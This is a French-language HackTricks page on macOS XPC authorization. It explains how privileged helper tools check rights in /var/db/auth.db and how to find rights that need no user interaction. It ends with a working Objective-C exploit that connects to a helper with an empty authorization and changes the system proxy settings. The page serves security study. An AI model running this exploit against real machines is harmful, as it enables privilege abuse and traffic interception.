# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple propose également une autre façon d'authentifier si le processus de connexion a **les permissions d'appeler une méthode XPC exposée**.

Lorsqu'une application a besoin d'**exécuter des actions en tant qu'utilisateur privilégié**, au lieu d'exécuter l'application en tant qu'utilisateur privilégié, elle installe généralement un HelperTool en tant que service XPC qui peut être appelé depuis l'application pour effectuer ces actions. Cependant, l'application appelant le service doit avoir suffisamment d'autorisation.

### ShouldAcceptNewConnection toujours OUI

Un exemple peut être trouvé dans [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Dans `App/AppDelegate.m`, il essaie de **se connecter** au **HelperTool**. Et dans `HelperTool/HelperTool.m`, la fonction **`shouldAcceptNewConnection`** **ne vérifiera pas** les exigences indiquées précédemment. Elle renverra toujours OUI :
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Pour plus d'informations sur la façon de configurer correctement ce contrôle :

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Droits d'application

Cependant, il y a une **autorisation en cours lorsque qu'une méthode du HelperTool est appelée**.

La fonction **`applicationDidFinishLaunching`** de `App/AppDelegate.m` créera une référence d'autorisation vide après le démarrage de l'application. Cela devrait toujours fonctionner.\
Ensuite, elle essaiera **d'ajouter des droits** à cette référence d'autorisation en appelant `setupAuthorizationRights` :
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
La fonction `setupAuthorizationRights` de `Common/Common.m` stockera dans la base de données d'authentification `/var/db/auth.db` les droits de l'application. Notez qu'elle n'ajoutera que les droits qui ne sont pas encore dans la base de données :
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
La fonction `enumerateRightsUsingBlock` est celle utilisée pour obtenir les autorisations des applications, qui sont définies dans `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Cela signifie qu'à la fin de ce processus, les autorisations déclarées à l'intérieur de `commandInfo` seront stockées dans `/var/db/auth.db`. Notez comment vous pouvez trouver pour **chaque méthode** qui nécessitera une **authentification**, **le nom de la permission** et le **`kCommandKeyAuthRightDefault`**. Ce dernier **indique qui peut obtenir ce droit**.

Il existe différents scopes pour indiquer qui peut accéder à un droit. Certains d'entre eux sont définis dans [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (vous pouvez trouver [tous ici](https://www.dssw.co.uk/reference/authorization-rights/)), mais en résumé :

<table><thead><tr><th width="284.3333333333333">Nom</th><th width="165">Valeur</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Tout le monde</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Personne</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>L'utilisateur actuel doit être un admin (dans le groupe admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Demander à l'utilisateur de s'authentifier.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Demander à l'utilisateur de s'authentifier. Il doit être un admin (dans le groupe admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Spécifier des règles</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Spécifier quelques commentaires supplémentaires sur le droit</td></tr></tbody></table>

### Vérification des droits

Dans `HelperTool/HelperTool.m`, la fonction **`readLicenseKeyAuthorization`** vérifie si l'appelant est autorisé à **exécuter cette méthode** en appelant la fonction **`checkAuthorization`**. Cette fonction vérifiera que les **authData** envoyés par le processus appelant ont un **format correct** et ensuite vérifiera **ce qui est nécessaire pour obtenir le droit** d'appeler la méthode spécifique. Si tout se passe bien, l'**`error` retourné sera `nil`** :
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Notez que pour **vérifier les exigences pour obtenir le droit** d'appeler cette méthode, la fonction `authorizationRightForCommand` va simplement vérifier l'objet de commentaire précédent **`commandInfo`**. Ensuite, elle appellera **`AuthorizationCopyRights`** pour vérifier **si elle a les droits** d'appeler la fonction (notez que les drapeaux permettent l'interaction avec l'utilisateur).

Dans ce cas, pour appeler la fonction `readLicenseKeyAuthorization`, le `kCommandKeyAuthRightDefault` est défini sur `@kAuthorizationRuleClassAllow`. Donc **tout le monde peut l'appeler**.

### Informations sur la base de données

Il a été mentionné que ces informations sont stockées dans `/var/db/auth.db`. Vous pouvez lister toutes les règles stockées avec :
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Ensuite, vous pouvez lire qui peut accéder au droit avec :
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Droits permissifs

Vous pouvez trouver **toutes les configurations de permissions** [**ici**](https://www.dssw.co.uk/reference/authorization-rights/), mais les combinaisons qui ne nécessiteront pas d'interaction de l'utilisateur seraient :

1. **'authenticate-user': 'false'**
- C'est la clé la plus directe. Si elle est définie sur `false`, cela spécifie qu'un utilisateur n'a pas besoin de fournir d'authentification pour obtenir ce droit.
- Cela est utilisé en **combinaison avec l'une des 2 ci-dessous ou en indiquant un groupe** auquel l'utilisateur doit appartenir.
2. **'allow-root': 'true'**
- Si un utilisateur opère en tant qu'utilisateur root (qui a des permissions élevées), et que cette clé est définie sur `true`, l'utilisateur root pourrait potentiellement obtenir ce droit sans authentification supplémentaire. Cependant, en général, accéder à un statut d'utilisateur root nécessite déjà une authentification, donc ce n'est pas un scénario "sans authentification" pour la plupart des utilisateurs.
3. **'session-owner': 'true'**
- Si défini sur `true`, le propriétaire de la session (l'utilisateur actuellement connecté) obtiendrait automatiquement ce droit. Cela pourrait contourner une authentification supplémentaire si l'utilisateur est déjà connecté.
4. **'shared': 'true'**
- Cette clé ne confère pas de droits sans authentification. Au lieu de cela, si elle est définie sur `true`, cela signifie qu'une fois le droit authentifié, il peut être partagé entre plusieurs processus sans que chacun d'eux ait besoin de se ré-authentifier. Mais l'octroi initial du droit nécessiterait toujours une authentification, sauf s'il est combiné avec d'autres clés comme `'authenticate-user': 'false'`.

Vous pouvez [**utiliser ce script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) pour obtenir les droits intéressants :
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Reversing Authorization

### Checking if EvenBetterAuthorization is used

Si vous trouvez la fonction : **`[HelperTool checkAuthorization:command:]`**, il est probable que le processus utilise le schéma mentionné précédemment pour l'autorisation :

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Cela, si cette fonction appelle des fonctions telles que `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, elle utilise [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Vérifiez le **`/var/db/auth.db`** pour voir s'il est possible d'obtenir des autorisations pour appeler une action privilégiée sans interaction de l'utilisateur.

### Protocol Communication

Ensuite, vous devez trouver le schéma de protocole afin de pouvoir établir une communication avec le service XPC.

La fonction **`shouldAcceptNewConnection`** indique le protocole étant exporté :

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Dans ce cas, nous avons la même chose que dans EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Sachant le nom du protocole utilisé, il est possible de **dump its header definition** avec :
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Enfin, nous devons juste connaître le **nom du service Mach exposé** afin d'établir une communication avec celui-ci. Il existe plusieurs façons de le trouver :

- Dans le **`[HelperTool init]`** où vous pouvez voir le service Mach utilisé :

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Dans le plist launchd :
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exemple d'Exploitation

Dans cet exemple, il est créé :

- La définition du protocole avec les fonctions
- Une authentification vide à utiliser pour demander l'accès
- Une connexion au service XPC
- Un appel à la fonction si la connexion a réussi
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Autres helpers de privilèges XPC abusés

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Références

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)

{{#include ../../../../../banners/hacktricks-training.md}}
